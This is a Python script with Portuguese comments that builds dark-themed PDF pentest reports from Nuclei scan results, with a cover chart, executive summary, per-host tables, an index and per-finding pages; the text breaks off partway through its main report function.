#!/usr/bin/env python3
"""
nuclei_report.py — Gerador de relatórios PDF para scans do Nuclei
Uso:
  python nuclei_report.py -i results.jsonl -o report.pdf
  python nuclei_report.py -i results.jsonl -o report.pdf --title "Pentest ACME" --author "João Silva"
  python nuclei_report.py --demo
  python nuclei_report.py --demo --author "Red Team" --title "Avaliação Trimestral"

Melhorias nesta versão:
  - Cada finding sempre começa no topo de uma nova página
  - Rodapé simplificado: apenas nome do relatório + número de página
  - Suporte completo a múltiplos hosts no mesmo arquivo de resultados
  - Seção de sumário por host no relatório executivo
  - Índice agrupado por host
"""

import argparse
import json
import sys
import os
from datetime import datetime
from collections import defaultdict

from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.lib.units import cm
from reportlab.lib.styles import ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_RIGHT, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    PageBreak, KeepTogether, BaseDocTemplate, Frame, PageTemplate, NextPageTemplate,
)
from reportlab.platypus.flowables import Flowable

# ══════════════════════════════════════════════════════════════════════════════
#  Paleta
# ══════════════════════════════════════════════════════════════════════════════
BLACK        = colors.HexColor("#000000")
DARK_BG      = colors.HexColor("#0A0A0A")
PANEL_BG     = colors.HexColor("#111111")
PANEL_MID    = colors.HexColor("#1A1A1A")
BORDER_COLOR = colors.HexColor("#2A2A2A")
BORDER_LIGHT = colors.HexColor("#333333")
ACCENT       = colors.HexColor("#00C8FF")
TEXT_PRIMARY = colors.HexColor("#E8E8E8")
TEXT_MUTED   = colors.HexColor("#666666")
TEXT_DIM     = colors.HexColor("#444444")
GREEN        = colors.HexColor("#00FF88")
WHITE        = colors.HexColor("#FFFFFF")

CRITICAL_CLR = colors.HexColor("#FF2D2D")
HIGH_CLR     = colors.HexColor("#FF6B35")
MEDIUM_CLR   = colors.HexColor("#FFB627")
LOW_CLR      = colors.HexColor("#4FC3F7")
INFO_CLR     = colors.HexColor("#78909C")

SEVERITY_COLOR = {
    "critical": CRITICAL_CLR,
    "high":     HIGH_CLR,
    "medium":   MEDIUM_CLR,
    "low":      LOW_CLR,
    "info":     INFO_CLR,
    "unknown":  TEXT_MUTED,
}

SEVERITY_ORDER = ["critical", "high", "medium", "low", "info", "unknown"]

PAGE_W, PAGE_H = A4
MARGIN         = 2 * cm
USABLE_W       = PAGE_W - 2 * MARGIN

HEADER_H = 28
FOOTER_H = 20


# ══════════════════════════════════════════════════════════════════════════════
#  Utilitários
# ══════════════════════════════════════════════════════════════════════════════

def safe(text: str, max_len: int = 400) -> str:
    return (str(text)[:max_len]
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;"))


def hex_color(c: colors.Color) -> str:
    r = int(c.red * 255)
    g = int(c.green * 255)
    b = int(c.blue * 255)
    return f"#{r:02X}{g:02X}{b:02X}"


def normalize_host(matched_at: str) -> str:
    """Extrai host limpo de uma URL."""
    host = str(matched_at)
    # remove protocolo
    for proto in ["https://", "http://"]:
        if host.startswith(proto):
            host = host[len(proto):]
            break
    # remove path
    for sep in ["/", "?", "#"]:
        if sep in host:
            host = host.split(sep)[0]
            break
    return host.strip() or matched_at


# ══════════════════════════════════════════════════════════════════════════════
#  Estilos
# ══════════════════════════════════════════════════════════════════════════════

def make_styles():
    def P(name, **kw):
        defaults = dict(fontName="Helvetica", fontSize=9, textColor=TEXT_PRIMARY,
                        leading=13, spaceBefore=0, spaceAfter=0, backColor=None)
        defaults.update(kw)
        return ParagraphStyle(name, **defaults)

    return {
        "h1":       P("h1",  fontName="Helvetica-Bold", fontSize=15,
                       textColor=ACCENT, spaceBefore=12, spaceAfter=5),
        "h2":       P("h2",  fontName="Helvetica-Bold", fontSize=12,
                       textColor=WHITE,  spaceBefore=8,  spaceAfter=3),
        "h3":       P("h3",  fontName="Helvetica-Bold", fontSize=10,
                       textColor=ACCENT, spaceBefore=6,  spaceAfter=2),
        "h_host":   P("h_host", fontName="Helvetica-Bold", fontSize=11,
                       textColor=WHITE, spaceBefore=10, spaceAfter=2),
        "body":     P("body",  fontSize=9, textColor=TEXT_PRIMARY,
                       leading=14, alignment=TA_JUSTIFY),
        "code":     P("code",  fontName="Courier", fontSize=7.2,
                       textColor=GREEN, leading=10.5,
                       backColor=BLACK, borderPadding=(5, 7, 5, 7)),
        "label":    P("label", fontName="Helvetica-Bold", fontSize=7.5,
                       textColor=TEXT_MUTED, leading=11),
        "value":    P("value", fontSize=8.5, textColor=TEXT_PRIMARY, leading=12),
        "muted":    P("muted", fontSize=8,   textColor=TEXT_MUTED),
        "small":    P("small", fontSize=7,   textColor=TEXT_DIM),
        "centered": P("centered", fontSize=9, textColor=TEXT_PRIMARY,
                       alignment=TA_CENTER),
    }


# ══════════════════════════════════════════════════════════════════════════════
#  Flowables
# ══════════════════════════════════════════════════════════════════════════════

class DividerLine(Flowable):
    def __init__(self, width=USABLE_W, color=BORDER_COLOR, thickness=0.5):
        super().__init__()
        self.width     = width
        self.color     = color
        self.thickness = thickness
        self.height    = thickness + 3

    def draw(self):
        self.canv.setStrokeColor(self.color)
        self.canv.setLineWidth(self.thickness)
        self.canv.line(0, self.thickness, self.width, self.thickness)


class AccentBar(Flowable):
    def __init__(self, width=USABLE_W, color=ACCENT, height=1.5):
        super().__init__()
        self.width  = width
        self.color  = color
        self.height = height + 2

    def draw(self):
        self.canv.setFillColor(self.color)
        self.canv.rect(0, 1, self.width, self.height - 2, stroke=0, fill=1)


class HostBanner(Flowable):
    """Banner de separação de host."""
    def __init__(self, host: str, count: int, width=USABLE_W):
        super().__init__()
        self.host  = host
        self.count = count
        self.width = width
        self.height = 28

    def draw(self):
        c = self.canv
        c.setFillColor(colors.HexColor("#0D1117"))
        c.roundRect(0, 0, self.width, self.height, 4, stroke=0, fill=1)
        c.setFillColor(ACCENT)
        c.rect(0, 0, 3, self.height, stroke=0, fill=1)
        c.setFont("Helvetica-Bold", 9.5)
        c.setFillColor(ACCENT)
        c.drawString(12, 17, "HOST")
        c.setFont("Helvetica", 9.5)
        c.setFillColor(WHITE)
        c.drawString(46, 17, safe(self.host, 70))
        c.setFont("Helvetica", 8)
        c.setFillColor(TEXT_MUTED)
        c.drawRightString(self.width - 8, 17,
                          f"{self.count} finding{'s' if self.count != 1 else ''}")
        c.setStrokeColor(BORDER_COLOR)
        c.setLineWidth(0.4)
        c.roundRect(0, 0, self.width, self.height, 4, stroke=1, fill=0)


# ══════════════════════════════════════════════════════════════════════════════
#  Capa
# ══════════════════════════════════════════════════════════════════════════════

def _cover_wrap(text: str, max_chars: int) -> list:
    words = text.split()
    lines, line = [], ""
    for word in words:
        if len(line) + len(word) + 1 <= max_chars:
            line = (line + " " + word).strip()
        else:
            if line:
                lines.append(line)
            line = word
    if line:
        lines.append(line)
    return lines or [""]


def _cover_donut(c, x, y, size, counts, total):
    cx    = x + size / 2
    cy    = y + size / 2
    R     = size * 0.44
    r_in  = size * 0.27
    angle = 90
    for sev in SEVERITY_ORDER:
        cnt = counts.get(sev, 0)
        if cnt == 0:
            continue
        sweep = cnt / total * 360
        c.setFillColor(SEVERITY_COLOR.get(sev, TEXT_MUTED))
        c.setStrokeColor(BLACK)
        c.setLineWidth(1.5)
        c.wedge(cx - R, cy - R, cx + R, cy + R, angle, sweep, stroke=1, fill=1)
        angle += sweep
    c.setFillColor(colors.HexColor("#030303"))
    c.circle(cx, cy, r_in, stroke=0, fill=1)
    c.setFillColor(WHITE)
    c.setFont("Helvetica-Bold", int(size * 0.15))
    c.drawCentredString(cx, cy + size * 0.03, str(total))
    c.setFont("Helvetica", int(size * 0.08))
    c.setFillColor(TEXT_MUTED)
    c.drawCentredString(cx, cy - size * 0.10, "total")


def draw_executive_cover(c, doc, title, hosts_info, author, findings):
    """Capa executiva — desenhada diretamente no canvas."""
    w, h = PAGE_W, PAGE_H

    counts = {s: 0 for s in SEVERITY_ORDER}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    total      = len(findings)
    host_count = len(hosts_info)
    title      = title or "Vulnerability Assessment Report"

    # Fundo
    c.setFillColor(BLACK)
    c.rect(0, 0, w, h, stroke=0, fill=1)

    # Faixa lateral
    c.setFillColor(ACCENT)
    c.rect(0, 0, 6, h, stroke=0, fill=1)

    # Faixa superior
    top_h = h * 0.08
    c.setFillColor(colors.HexColor("#050505"))
    c.rect(0, h - top_h, w, top_h, stroke=0, fill=1)
    c.setFont("Helvetica-Bold", 11)
    c.setFillColor(ACCENT)
    c.drawString(18, h - top_h + 14, "Vulnerability Scanner")
    c.setFont("Helvetica", 7.5)
    c.setFillColor(TEXT_MUTED)
    c.drawRightString(w - 18, h - top_h + 14, "Confidential — Security Assessment")

    # Área hero
    hero_y = h * 0.52
    hero_h = h * 0.30
    c.setFillColor(colors.HexColor("#0D0D0D"))
    c.rect(6, hero_y, w - 6, hero_h, stroke=0, fill=1)
    c.setFillColor(colors.HexColor("#1C1C1C"))
    for dx in range(0, int(w - 6), 14):
        for dy in range(0, int(hero_h), 14):
            c.circle(6 + dx, hero_y + dy, 0.8, stroke=0, fill=1)
    c.setFillColor(ACCENT)
    c.rect(6, hero_y, w - 6, 1.5, stroke=0, fill=1)
    c.rect(6, hero_y + hero_h - 1.5, w - 6, 1.5, stroke=0, fill=1)

    cx = 6 + (w - 6) / 2

    # Título centralizado verticalmente no hero
    title_lines = _cover_wrap(title, 38)
    line_sizes = [28 if len(l) < 22 else 22 for l in title_lines[:3]]
    total_title_h = sum(s * 1.3 for s in line_sizes)
    hero_center_y = hero_y + hero_h / 2
    ty = hero_center_y + total_title_h / 2 - 4
    for i, line in enumerate(title_lines[:3]):
        font_size = line_sizes[i]
        c.setFont("Helvetica-Bold", font_size)
        c.setFillColor(WHITE)
        c.drawCentredString(cx, ty, line)
        ty -= font_size * 1.3



    # Painel de metadados
    meta_y  = hero_y - 2
    meta_h  = h * 0.14
    meta_x0 = 7
    c.setFillColor(colors.HexColor("#070707"))
    c.rect(meta_x0, meta_y - meta_h, w - meta_x0, meta_h, stroke=0, fill=1)

    cols_data = [
        ("DATA DO RELATÓRIO", datetime.now().strftime("%d/%m/%Y  %H:%M")),
        ("TOTAL DE FINDINGS", str(total)),
        ("HOSTS AVALIADOS",   str(host_count)),
    ]
    if author:
        cols_data.insert(1, ("AUTOR", author[:28]))

    col_w = (w - meta_x0) / len(cols_data)
    for i, (lbl2, val) in enumerate(cols_data):
        mx = meta_x0 + i * col_w + col_w / 2
        if i > 0:
            c.setStrokeColor(BORDER_COLOR)
            c.setLineWidth(0.4)
            c.line(meta_x0 + i * col_w, meta_y - meta_h + 10,
                   meta_x0 + i * col_w, meta_y - 10)
        c.setFont("Helvetica-Bold", 6.5)
        c.setFillColor(TEXT_MUTED)
        c.drawCentredString(mx, meta_y - 22, lbl2)
        c.setFont("Helvetica-Bold", 11)
        c.setFillColor(WHITE)
        c.drawCentredString(mx, meta_y - meta_h + 18, val)

    # Painel inferior — donut + legenda
    sev_panel_h = meta_y - meta_h - 2
    c.setFillColor(colors.HexColor("#030303"))
    c.rect(meta_x0, 0, w - meta_x0, sev_panel_h, stroke=0, fill=1)

    donut_size = min(sev_panel_h * 0.75, 115)
    donut_x    = meta_x0 + 22
    donut_y    = (sev_panel_h - donut_size) / 2
    _cover_donut(c, donut_x, donut_y, donut_size, counts, total)

    leg_x = donut_x + donut_size + 18
    leg_y = donut_y + donut_size - 10
    for sev in SEVERITY_ORDER:
        cnt = counts.get(sev, 0)
        if cnt == 0:
            continue
        col = SEVERITY_COLOR.get(sev, TEXT_MUTED)
        c.setFillColor(col)
        c.circle(leg_x + 5, leg_y + 4, 4.5, stroke=0, fill=1)
        c.setFont("Helvetica-Bold", 8)
        c.setFillColor(col)
        c.drawString(leg_x + 14, leg_y + 1, sev.upper())
        c.setFont("Helvetica-Bold", 10)
        c.setFillColor(WHITE)
        c.drawString(leg_x + 70, leg_y, str(cnt))
        bar_max = 70
        bar_len = max(3, int(cnt / total * bar_max))
        c.setFillColor(col)
        c.setFillAlpha(0.22)
        c.rect(leg_x + 100, leg_y + 1, bar_max, 8, stroke=0, fill=1)
        c.setFillAlpha(0.90)
        c.rect(leg_x + 100, leg_y + 1, bar_len, 8, stroke=0, fill=1)
        c.setFillAlpha(1)
        leg_y -= 19

    c.setFillColor(ACCENT)
    c.rect(0, 0, w, 2, stroke=0, fill=1)


# ══════════════════════════════════════════════════════════════════════════════
#  Parser / Normalizador
# ══════════════════════════════════════════════════════════════════════════════

def parse_nuclei_jsonl(path: str) -> list:
    with open(path, encoding="utf-8", errors="replace") as f:
        raw = f.read().strip()
    if raw.startswith("["):
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            pass
    findings = []
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            findings.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return findings


def normalize_finding(raw: dict) -> dict:
    info   = raw.get("info", {})
    sev    = (info.get("severity") or raw.get("severity") or "unknown").lower()
    ext    = raw.get("extracted-results", raw.get("extracted_results", []))
    if isinstance(ext, str):
        ext = [ext]
    classification = info.get("classification", {}) or {}
    cve_ids = classification.get("cve-id",  []) or []
    cwe_ids = classification.get("cwe-id",  []) or []
    cvss    = classification.get("cvss-score", "")
    refs    = info.get("reference", info.get("references", [])) or []
    if isinstance(refs, str):
        refs = [refs]
    tags = info.get("tags", [])
    if isinstance(tags, str):
        tags = [t.strip() for t in tags.split(",")]

    matched_at = raw.get("matched-at", raw.get("matched", raw.get("host", "")))
    host_raw   = raw.get("host", "")
    # Determina o host canônico
    host_key = normalize_host(host_raw or matched_at)

    return {
        "template_id":   raw.get("template-id", raw.get("templateID", "N/A")),
        "template_name": info.get("name", "N/A"),
        "severity":      sev,
        "description":   info.get("description", ""),
        "remediation":   info.get("remediation") or info.get("fix") or "",
        "references":    refs,
        "tags":          tags,
        "cve_ids":       cve_ids if isinstance(cve_ids, list) else [cve_ids],
        "cwe_ids":       cwe_ids if isinstance(cwe_ids, list) else [cwe_ids],
        "cvss":          str(cvss),
        "matched_at":    matched_at,
        "ip":            raw.get("ip", ""),
        "timestamp":     raw.get("timestamp", raw.get("created_at", "")),
        "request":       raw.get("request",  raw.get("curl-command", "")),
        "response":      raw.get("response", ""),
        "extracted":     ext,
        "matcher_name":  raw.get("matcher-name", ""),
        "type":          raw.get("type", ""),
        "host":          host_raw,
        "host_key":      host_key,
    }


# ══════════════════════════════════════════════════════════════════════════════
#  Seções do relatório
# ══════════════════════════════════════════════════════════════════════════════

def _code_block(content: str, styles, max_lines=55) -> list:
    if not content:
        return []
    lines = content.splitlines()
    if len(lines) > max_lines:
        lines = lines[:max_lines] + [f"... [{len(lines) - max_lines} linhas omitidas]"]
    escaped = "\n".join(
        l.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        for l in lines
    )
    return [Paragraph(escaped.replace("\n", "<br/>"), styles["code"])]


def build_executive_summary(story, styles, findings, hosts_info, title, author):
    counts = {s: 0 for s in SEVERITY_ORDER}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    total      = len(findings)
    host_count = len(hosts_info)

    story.append(Paragraph("Sumário Executivo", styles["h1"]))
    story.append(AccentBar())
    story.append(Spacer(1, 0.35 * cm))

    sev_list = ", ".join(
        f"<b>{counts[s]}</b> {s}"
        for s in SEVERITY_ORDER if counts[s] > 0
    )
    intro = (
        f"Este documento apresenta os resultados do scan de segurança realizado com o Nuclei. "
        f"Foram avaliados <b>{host_count}</b> host(s) e identificados <b>{total}</b> finding(s): "
        f"{sev_list}. O relatório detalha cada vulnerabilidade encontrada com informações do "
        f"template, requisição/resposta HTTP, remediação recomendada e referências externas."
    )
    story.append(Paragraph(intro, styles["body"]))
    story.append(Spacer(1, 0.4 * cm))

    # Info geral
    rows_info = [
        ["Data do Scan",      datetime.now().strftime("%d/%m/%Y %H:%M")],
        ["Ferramenta",        "Nuclei — ProjectDiscovery"],
        ["Hosts Avaliados",   str(host_count)],
        ["Total de Findings", str(total)],
    ]
    if author:
        rows_info.insert(0, ["Autor", safe(author)])

    info_cells = [
        [Paragraph(k, styles["label"]), Paragraph(v, styles["value"])]
        for k, v in rows_info
    ]
    info_tbl = Table(info_cells, colWidths=[4 * cm, USABLE_W - 4 * cm])
    info_tbl.setStyle(TableStyle([
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [PANEL_BG, PANEL_MID]),
        ("TOPPADDING",     (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 4),
        ("LEFTPADDING",    (0, 0), (0, -1),  8),
        ("LEFTPADDING",    (1, 0), (1, -1),  6),
        ("LINEAFTER",      (0, 0), (0, -1),  0.5, BORDER_COLOR),
        ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
    ]))
    story.append(info_tbl)
    story.append(Spacer(1, 0.5 * cm))

    # Distribuição de severidades
    story.append(Paragraph("Distribuição de Severidades", styles["h2"]))
    story.append(Spacer(1, 0.2 * cm))

    sev_header = [
        Paragraph("Severidade", styles["label"]),
        Paragraph("Qtd",        styles["label"]),
        Paragraph("Proporção",  styles["label"]),
        Paragraph("Barra Visual", styles["label"]),
    ]
    sev_rows = [sev_header]
    for sev in SEVERITY_ORDER:
        cnt = counts[sev]
        if cnt == 0:
            continue
        col     = SEVERITY_COLOR.get(sev, TEXT_MUTED)
        pct     = cnt / total * 100
        bar_f   = int(pct / 100 * 30)
        bar     = "█" * bar_f + "░" * (30 - bar_f)
        sev_rows.append([
            Paragraph(f'<font color="{hex_color(col)}"><b>{sev.upper()}</b></font>', styles["value"]),
            Paragraph(str(cnt),       styles["value"]),
            Paragraph(f"{pct:.1f}%",  styles["muted"]),
            Paragraph(f'<font color="{hex_color(col)}" size="6">{bar}</font>', styles["small"]),
        ])

    sev_tbl = Table(sev_rows, colWidths=[3.2*cm, 1.5*cm, 2*cm, USABLE_W - 6.7*cm])
    sev_tbl.setStyle(TableStyle([
        ("BACKGROUND",     (0, 0), (-1, 0), BORDER_LIGHT),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [PANEL_BG, PANEL_MID]),
        ("TOPPADDING",     (0, 0), (-1, -1), 5),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 5),
        ("LEFTPADDING",    (0, 0), (-1, -1), 7),
        ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
    ]))
    story.append(sev_tbl)
    story.append(Spacer(1, 0.5 * cm))

    # Resumo por host
    if host_count > 1:
        story.append(Paragraph("Resumo por Host", styles["h2"]))
        story.append(Spacer(1, 0.2 * cm))

        host_header = [
            Paragraph("Host",     styles["label"]),
            Paragraph("Critical", styles["label"]),
            Paragraph("High",     styles["label"]),
            Paragraph("Medium",   styles["label"]),
            Paragraph("Low",      styles["label"]),
            Paragraph("Info",     styles["label"]),
            Paragraph("Total",    styles["label"]),
        ]
        host_rows = [host_header]
        for host, hfinds in sorted(hosts_info.items(),
                                   key=lambda x: -len(x[1])):
            hcounts = {s: 0 for s in SEVERITY_ORDER}
            for hf in hfinds:
                hcounts[hf["severity"]] += 1
            host_rows.append([
                Paragraph(safe(host, 45), styles["value"]),
                Paragraph(
                    f'<font color="{hex_color(CRITICAL_CLR)}">'
                    f'<b>{hcounts["critical"]}</b></font>' if hcounts["critical"] else "—",
                    styles["value"]),
                Paragraph(
                    f'<font color="{hex_color(HIGH_CLR)}">'
                    f'<b>{hcounts["high"]}</b></font>' if hcounts["high"] else "—",
                    styles["value"]),
                Paragraph(
                    f'<font color="{hex_color(MEDIUM_CLR)}">'
                    f'{hcounts["medium"]}</font>' if hcounts["medium"] else "—",
                    styles["value"]),
                Paragraph(
                    f'<font color="{hex_color(LOW_CLR)}">'
                    f'{hcounts["low"]}</font>' if hcounts["low"] else "—",
                    styles["value"]),
                Paragraph(str(hcounts["info"]) if hcounts["info"] else "—", styles["muted"]),
                Paragraph(f"<b>{len(hfinds)}</b>", styles["value"]),
            ])

        col_ws = [USABLE_W - 6*1.3*cm] + [1.3*cm]*6
        host_tbl = Table(host_rows, colWidths=col_ws)
        host_tbl.setStyle(TableStyle([
            ("BACKGROUND",     (0, 0), (-1, 0), BORDER_LIGHT),
            ("ROWBACKGROUNDS", (0, 1), (-1, -1), [PANEL_BG, PANEL_MID]),
            ("TOPPADDING",     (0, 0), (-1, -1), 5),
            ("BOTTOMPADDING",  (0, 0), (-1, -1), 5),
            ("LEFTPADDING",    (0, 0), (-1, -1), 6),
            ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
            ("ALIGN",          (1, 0), (-1, -1), "CENTER"),
        ]))
        story.append(host_tbl)
        story.append(Spacer(1, 0.5 * cm))

    # Top riscos
    top = [f for f in findings if f["severity"] in ("critical", "high")][:8]
    if top:
        story.append(Paragraph("Principais Riscos — Ação Imediata Recomendada", styles["h2"]))
        story.append(Spacer(1, 0.15 * cm))
        for f in top:
            col = SEVERITY_COLOR.get(f["severity"], TEXT_MUTED)
            row_data = [[
                Paragraph(f'<font color="{hex_color(col)}"><b>{f["severity"].upper()}</b></font>',
                          styles["value"]),
                Paragraph(safe(f["template_name"]), styles["value"]),
                Paragraph(safe(f["host_key"], 55),  styles["muted"]),
            ]]
            rt = Table(row_data, colWidths=[2.5*cm, 8*cm, USABLE_W - 10.5*cm])
            rt.setStyle(TableStyle([
                ("BACKGROUND",    (0, 0), (-1, -1), PANEL_BG),
                ("LINEBELOW",     (0, 0), (-1, -1), 0.4, BORDER_COLOR),
                ("TOPPADDING",    (0, 0), (-1, -1), 5),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
                ("LEFTPADDING",   (0, 0), (-1, -1), 7),
                ("LINEBEFORE",    (0, 0), (0, -1),  2.5, col),
            ]))
            story.append(rt)

    story.append(PageBreak())


def build_index(story, styles, findings, hosts_info):
    """Índice único de todos os findings."""
    story.append(Paragraph("Índice de Findings", styles["h1"]))
    story.append(AccentBar())
    story.append(Spacer(1, 0.3 * cm))

    header = [
        Paragraph("#",          styles["label"]),
        Paragraph("Severidade", styles["label"]),
        Paragraph("Template",   styles["label"]),
        Paragraph("URL / Alvo", styles["label"]),
        Paragraph("CVE / CWE",  styles["label"]),
    ]
    rows = [header]
    for i, f in enumerate(findings, 1):
        col = SEVERITY_COLOR.get(f["severity"], TEXT_MUTED)
        ids = ", ".join(f["cve_ids"] + f["cwe_ids"])[:28] or "—"
        rows.append([
            Paragraph(str(i), styles["muted"]),
            Paragraph(
                f'<font color="{hex_color(col)}"><b>{f["severity"].upper()}</b></font>',
                styles["value"]),
            Paragraph(safe(f["template_name"], 44), styles["value"]),
            Paragraph(safe(f["matched_at"],    50), styles["muted"]),
            Paragraph(safe(ids),                    styles["muted"]),
        ])

    col_ws = [1*cm, 2.5*cm, 5.8*cm, 5.5*cm, USABLE_W - 14.8*cm]
    tbl = Table(rows, colWidths=col_ws)
    tbl.setStyle(TableStyle([
        ("BACKGROUND",     (0, 0), (-1, 0), BORDER_LIGHT),
        ("FONTSIZE",       (0, 0), (-1, -1), 8),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [PANEL_BG, PANEL_MID]),
        ("TOPPADDING",     (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 4),
        ("LEFTPADDING",    (0, 0), (-1, -1), 5),
        ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
    ]))
    story.append(tbl)
    story.append(PageBreak())


def build_finding(story, styles, finding, index, total):
    """
    Cada finding é precedido de PageBreak para garantir início no topo da página.
    O cabeçalho do finding é mantido junto ao primeiro bloco de conteúdo via KeepTogether.
    """
    sev     = finding["severity"]
    col     = SEVERITY_COLOR.get(sev, TEXT_MUTED)
    col_hex = hex_color(col)

    # ── Cabeçalho do finding (sempre no topo da nova página) ─────────────────
    hdr = [[
        Paragraph(
            f'<font color="{col_hex}">■</font>  '
            f'<font color="{col_hex}"><b>{sev.upper()}</b></font>  '
            f'<b>{safe(finding["template_name"])}</b>',
            ParagraphStyle("fh", fontName="Helvetica-Bold", fontSize=11,
                           textColor=WHITE, leading=15, backColor=None)
        ),
        Paragraph(f"#{index}/{total}", styles["muted"]),
    ]]
    hdr_tbl = Table(hdr, colWidths=[USABLE_W - 2*cm, 2*cm])
    hdr_tbl.setStyle(TableStyle([
        ("BACKGROUND",    (0, 0), (-1, -1), PANEL_BG),
        ("TOPPADDING",    (0, 0), (-1, -1), 9),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 9),
        ("LEFTPADDING",   (0, 0), (0, 0),   10),
        ("RIGHTPADDING",  (1, 0), (1, 0),   8),
        ("ALIGN",         (1, 0), (1, 0),   "RIGHT"),
        ("VALIGN",        (0, 0), (-1, -1), "MIDDLE"),
        ("LINEBELOW",     (0, 0), (-1, 0),  2, col),
    ]))

    # Host banner se presente
    host_banner_items = []
    if finding["host_key"]:
        host_label = Table(
            [[Paragraph(
                f'<font color="{hex_color(ACCENT)}">⬡</font>  '
                f'<font color="{hex_color(TEXT_MUTED)}">HOST:</font>  '
                f'<font color="{hex_color(TEXT_PRIMARY)}">{safe(finding["host_key"], 80)}</font>',
                styles["value"]
            )]],
            colWidths=[USABLE_W]
        )
        host_label.setStyle(TableStyle([
            ("BACKGROUND",    (0, 0), (-1, -1), colors.HexColor("#0D1117")),
            ("TOPPADDING",    (0, 0), (-1, -1), 4),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
            ("LEFTPADDING",   (0, 0), (-1, -1), 10),
        ]))
        host_banner_items = [host_label, Spacer(1, 0.1*cm)]

    # Metadados
    meta = [
        ["Template ID",  finding["template_id"]],
        ["URL / Alvo",   finding["matched_at"]],
        ["IP",           finding["ip"]           or "—"],
        ["Tipo",         finding["type"]          or "—"],
        ["Matcher",      finding["matcher_name"]  or "—"],
        ["Timestamp",    finding["timestamp"]     or "—"],
    ]
    if finding["cvss"]:
        meta.append(["CVSS Score", finding["cvss"]])
    if finding["cve_ids"]:
        meta.append(["CVE(s)",  ", ".join(finding["cve_ids"])])
    if finding["cwe_ids"]:
        meta.append(["CWE(s)",  ", ".join(finding["cwe_ids"])])
    if finding["tags"]:
        meta.append(["Tags",    ", ".join(finding["tags"])])

    meta_cells = [
        [Paragraph(k, styles["label"]),
         Paragraph(safe(str(v), 220), styles["value"])]
        for k, v in meta
    ]
    meta_tbl = Table(meta_cells, colWidths=[3.2*cm, USABLE_W - 3.2*cm])
    meta_tbl.setStyle(TableStyle([
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [DARK_BG, PANEL_BG]),
        ("TOPPADDING",     (0, 0), (-1, -1), 3),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 3),
        ("LEFTPADDING",    (0, 0), (0, -1),  8),
        ("LEFTPADDING",    (1, 0), (1, -1),  6),
        ("LINEAFTER",      (0, 0), (0, -1),  0.5, BORDER_COLOR),
        ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
    ]))

    # KeepTogether: cabeçalho + host + metadados (ficam na mesma página quando possível)
    story.append(KeepTogether([hdr_tbl] + host_banner_items + [meta_tbl]))
    story.append(Spacer(1, 0.22 * cm))

    # Descrição
    if finding["description"]:
        story.append(Paragraph("Descrição", styles["h3"]))
        story.append(Paragraph(safe(finding["description"]), styles["body"]))
        story.append(Spacer(1, 0.18 * cm))

    # Dados extraídos
    if finding["extracted"]:
        story.append(Paragraph("Dados Extraídos pelo Matcher", styles["h3"]))
        for item in finding["extracted"][:10]:
            story.append(Paragraph(f"• {safe(str(item), 280)}", styles["body"]))
        story.append(Spacer(1, 0.18 * cm))

    # Request
    if finding["request"]:
        story.append(Paragraph("Request HTTP", styles["h3"]))
        for el in _code_block(str(finding["request"]), styles, max_lines=45):
            story.append(el)
        story.append(Spacer(1, 0.18 * cm))

    # Response
    if finding["response"]:
        story.append(Paragraph("Response HTTP", styles["h3"]))
        for el in _code_block(str(finding["response"]), styles, max_lines=55):
            story.append(el)
        story.append(Spacer(1, 0.18 * cm))

    # Remediação
    if finding["remediation"]:
        story.append(Paragraph("Remediação / Correção Recomendada", styles["h3"]))
        rem_tbl = Table(
            [[Paragraph(safe(finding["remediation"]), styles["body"])]],
            colWidths=[USABLE_W]
        )
        rem_tbl.setStyle(TableStyle([
            ("BACKGROUND",    (0, 0), (-1, -1), PANEL_BG),
            ("TOPPADDING",    (0, 0), (-1, -1), 7),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
            ("LEFTPADDING",   (0, 0), (-1, -1), 10),
            ("RIGHTPADDING",  (0, 0), (-1, -1), 10),
            ("LINEBEFORE",    (0, 0), (0, -1),  3, GREEN),
        ]))
        story.append(rem_tbl)
        story.append(Spacer(1, 0.18 * cm))

    # Referências
    if finding["references"]:
        story.append(Paragraph("Referências", styles["h3"]))
        for ref in finding["references"]:
            ref_str = str(ref).strip()
            if ref_str.startswith("http"):
                story.append(Paragraph(
                    f'• <a href="{ref_str}" color="{hex_color(ACCENT)}">'
                    f'{safe(ref_str, 100)}</a>',
                    styles["body"]))
            else:
                story.append(Paragraph(f"• {safe(ref_str, 120)}", styles["body"]))


# ══════════════════════════════════════════════════════════════════════════════
#  Função principal
# ══════════════════════════════════════════════════════════════════════════════

def generate_report(findings_raw: list, output_path: str,
                    report_title: str = "",
                    author:       str = "") -> str:

    findings = [normalize_finding(r) for r in findings_raw]
    order_map = {s: i for i, s in enumerate(SEVERITY_ORDER)}
    findings.sort(key=lambda f: (order_map.get(f["severity"], 99), f["host_key"]))

    styles = make_styles()

    # Agrupa por host
    hosts_info: dict = defaultdict(list)
    for f in findings:
